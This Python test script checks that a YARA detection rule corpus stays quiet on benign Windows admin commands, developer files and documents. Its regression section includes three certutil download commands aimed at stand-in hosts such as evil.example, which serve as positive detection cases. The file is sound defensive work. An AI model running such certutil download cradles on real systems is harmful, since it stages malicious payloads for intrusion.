"""False-positive calibration for the built-in YARA corpus.

The verify_yara suite proves every rule *fires* on hostile content. This one
proves the corpus stays quiet on content that is legitimately common on a
Windows machine: admin scripts, installers, developer tooling, documents.

A detection rule that fires on routine admin commands trains the user to ignore
alerts, which is worse than not having the rule. Every sample below is real
text you would actually find on disk.

Run:  python tools\\verify_yara_fp.py
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from scanner.yara_engine import compile_directory  # noqa: E402

PASS = 0
FAIL = 0


def check(label: str, condition: bool, detail: str = "") -> None:
    global PASS, FAIL
    if condition:
        PASS += 1
        print(f"  PASS  {label}")
    else:
        FAIL += 1
        print(f"  FAIL  {label}" + (f"\n        {detail}" if detail else ""))


rules_dir = Path(__file__).resolve().parent.parent / "scanner" / "rules"
rule_set = compile_directory(rules_dir)
print(f"\nLoaded {len(rule_set)} rules from {rules_dir}")


# --------------------------------------------------------------------------- #
# Legitimate content that must NOT be flagged.
# Each entry: (label, bytes, rules that are acceptable to fire)
# --------------------------------------------------------------------------- #

BENIGN = [
    # -- routine certutil use: the exact command that used to trip the rule -- #
    (
        "certutil flush the URL cache (routine housekeeping)",
        b"certutil -urlcache * delete",
        set(),
    ),
    (
        "certutil -urlcache delete on a specific entry",
        b"certutil.exe -urlcache -split delete 1.2.3.4",
        set(),
    ),
    (
        "certutil display a local certificate",
        b"certutil -dump C:\\certs\\corp-root.cer",
        set(),
    ),
    (
        "certutil verify a local file's signature",
        b"certutil -verify C:\\Windows\\System32\\notepad.exe",
        set(),
    ),
    (
        "certutil hash a file",
        b"certutil -hashfile C:\\temp\\report.pdf SHA256",
        set(),
    ),

    # -- routine bitsadmin use ------------------------------------------- #
    (
        "bitsadmin list jobs",
        b"bitsadmin /list /allusers",
        set(),
    ),
    (
        "bitsadmin cancel a stuck job",
        b"bitsadmin /cancel {A1B2C3D4-0000-0000-0000-000000000000}",
        set(),
    ),

    # -- routine mshta / rundll32 / regsvr32 ------------------------------ #
    (
        "rundll32 open the display properties",
        b"rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        set(),
    ),
    (
        "rundll32 clear the icon cache",
        b"rundll32.exe ie4uinit.exe -show",
        set(),
    ),
    (
        "regsvr32 register a local COM component",
        b"regsvr32 /s C:\\Program Files\\Contoso\\contoso.dll",
        set(),
    ),
    (
        "regsvr32 unregister a local component",
        b"regsvr32 /u C:\\Program Files\\Contoso\\old.dll",
        set(),
    ),

    # -- routine wmic ------------------------------------------------------ #
    (
        "wmic query installed products",
        b"wmic product get name,version",
        set(),
    ),
    (
        "wmic query the OS version",
        b"wmic os get caption,version /format:list",
        set(),
    ),

    # -- PowerShell that is not a download cradle ------------------------- #
    (
        "PowerShell download a file to disk (no execution)",
        b"Invoke-WebRequest -Uri https://aka.ms/vs/17/release/vs.exe "
        b"-OutFile C:\\temp\\vs.exe",
        set(),
    ),
    (
        "PowerShell set execution policy for a session",
        b"powershell -ExecutionPolicy Bypass -File .\\build.ps1",
        set(),
    ),
    (
        "PowerShell base64 decode a config value",
        b"$x = [System.Text.Encoding]::UTF8.GetString("
        b"[Convert]::FromBase64String($cfg))",
        set(),
    ),

    # -- developer tooling ------------------------------------------------- #
    (
        "python source with a URL and a subprocess call",
        b"import subprocess\n"
        b"subprocess.run(['curl', 'https://api.example.com/v1/health'])\n",
        set(),
    ),
    (
        "node package manifest",
        b'{"name":"app","version":"2.1.0","scripts":{"build":"tsc -p ."}}',
        set(),
    ),
    (
        "dockerfile",
        b"FROM node:20-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci\n"
        b"CMD [\"node\",\"server.js\"]\n",
        set(),
    ),
    (
        "CI workflow yaml",
        b"on: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
        b"    steps:\n      - uses: actions/checkout@v4\n"
        b"      - run: npm test\n",
        set(),
    ),
    (
        "git config",
        b"[remote \"origin\"]\n\turl = https://github.com/contoso/app.git\n"
        b"\tfetch = +refs/heads/*:refs/remotes/origin/*\n",
        set(),
    ),
    (
        "SQL migration script",
        b"ALTER TABLE invoices ADD COLUMN paid_at TIMESTAMP;\n"
        b"CREATE INDEX idx_paid ON invoices (paid_at);\n",
        set(),
    ),

    # -- documents --------------------------------------------------------- #
    (
        "business memo",
        b"To: All Staff\nFrom: Finance\nSubject: Q3 close\n\n"
        b"The close lands on the 5th. Send receipts to finance@contoso.com.\n",
        set(),
    ),
    (
        "invoice text",
        b"INVOICE 2026-0412\nVendor: Contoso Ltd\nAmount: 4,250.00 USD\n"
        b"Due: 2026-12-15\nPayment terms: Net 30\n",
        set(),
    ),
    (
        "HTML marketing page with a form",
        b"<html><body><form action=\"/subscribe\" method=\"post\">"
        b"<input type=\"email\" name=\"email\"><button>Join</button>"
        b"</form></body></html>",
        set(),
    ),
    (
        "HTML login page (legitimate, no mailto/php exfil)",
        b"<html><body><form action=\"/auth/login\" method=\"post\">"
        b"<input type=\"password\" name=\"pw\"></form></body></html>",
        set(),
    ),
    (
        "JSON API response",
        b'{"status":"ok","items":[{"id":1,"name":"widget"}],"total":1}',
        set(),
    ),
    (
        "log file",
        b"2026-11-17 09:14:02 INFO  server started on port 8080\n"
        b"2026-11-17 09:14:03 INFO  connected to database\n",
        set(),
    ),

    # -- a signed installer's embedded strings ---------------------------- #
    (
        "installer strings mentioning a URL and a temp path",
        b"Setup will install to C:\\Program Files\\Contoso.\n"
        b"Visit https://www.contoso.com/support for help.\n",
        set(),
    ),
    (
        "UPX mention in a build script (single string only)",
        b"echo packing with upx --best",
        set(),
    ),
    (
        "word 'monero' in a news article",
        b"Monero rose 4% today as exchanges reported higher volume.",
        set(),
    ),
    (
        "word 'mimikatz' in a security blog post",
        b"Attackers deployed Mimikatz to dump credentials from memory.",
        {"Credential_Dumping_Strings"},
    ),

    # -- content that tripped the corpus before it was tightened ------------- #
    (
        "security write-up about ransomware",
        b"Ransomware targets .docx, .xlsx and .pdf files. It calls "
        b"CryptEncrypt and DeleteFile to destroy originals.",
        set(),
    ),
    (
        "news article about Monero",
        b"Monero and other cryptocurrencies rely on the RandomX algorithm.",
        set(),
    ),
    (
        "HTML with an inline base64 image",
        b"<img src=\"data:image/png;base64," + b"A" * 220 + b"\">",
        set(),
    ),
    (
        "documentation mentioning Tor Browser and socks5",
        b"Tor Browser bundles the torproject proxy; configure socks5 in "
        b"settings to route traffic.",
        set(),
    ),
    (
        "API documentation naming injection functions",
        b"OpenProcess and VirtualAllocEx are documented Win32 APIs.",
        set(),
    ),
    (
        "PowerShell using a compression stream",
        b"$s = [IO.Compression.GZipStream]; $x = $a -join $b",
        set(),
    ),
]


print("\nLegitimate content stays quiet")
for label, payload, allowed in BENIGN:
    hits = {m.rule for m in rule_set.match(payload, label)}
    unexpected = hits - allowed
    check(
        label,
        not unexpected,
        f"unexpected hit(s): {sorted(unexpected)}"
        + (f" (allowed: {sorted(allowed)})" if allowed else ""),
    )


# --------------------------------------------------------------------------- #
# The specific regression this file exists for.
# --------------------------------------------------------------------------- #

print("\nRegression: certutil housekeeping vs certutil download")
HOUSEKEEPING = [
    b"certutil -urlcache * delete",
    b"certutil.exe -urlcache -split delete",
    b"certutil -urlcache -f delete 127.0.0.1",
]
for payload in HOUSEKEEPING:
    hits = {m.rule for m in rule_set.match(payload, "x")}
    check(f"no hit on {payload[:40].decode(errors='replace')!r}",
          "LOLBin_Abuse" not in hits, f"got {sorted(hits)}")

DOWNLOADS = [
    b"certutil -urlcache -split -f http://evil.example/a.exe a.exe",
    b"certutil.exe -urlcache -f https://cdn.evil.example/p.bin p.bin",
    b"certutil -verifyctl -split -f http://10.0.0.5/x.dll x.dll",
]
for payload in DOWNLOADS:
    hits = {m.rule for m in rule_set.match(payload, "x")}
    check(f"hit on {payload[:40].decode(errors='replace')!r}",
          "LOLBin_Abuse" in hits, f"got {sorted(hits)}")


# --------------------------------------------------------------------------- #
# Dead-string audit: every declared string should be reachable.
# A string defined but never referenced in the condition is dead weight that
# makes the rule look stronger than it is.
# --------------------------------------------------------------------------- #

print("\nCorpus hygiene")


def _referenced_by_wildcard(name: str, source: str) -> bool:
    """True when the condition reaches this string via a wildcard set."""
    import re

    stem = name[1:]  # drop the '$'
    for match in re.finditer(r"\$([A-Za-z0-9_]*)\*", source):
        if stem.startswith(match.group(1)):
            return True
    return "them" in source


for rule in rule_set:
    unused = [
        name for name in rule.patterns
        if name not in rule.condition_source
        and not _referenced_by_wildcard(name, rule.condition_source)
    ]
    check(f"{rule.name}: no dead strings", not unused,
          f"declared but unused in condition: {unused}")


print("\n" + "=" * 60)
print(f"PASSED: {PASS}   FAILED: {FAIL}")
print("=" * 60)
sys.exit(0 if FAIL == 0 else 1)
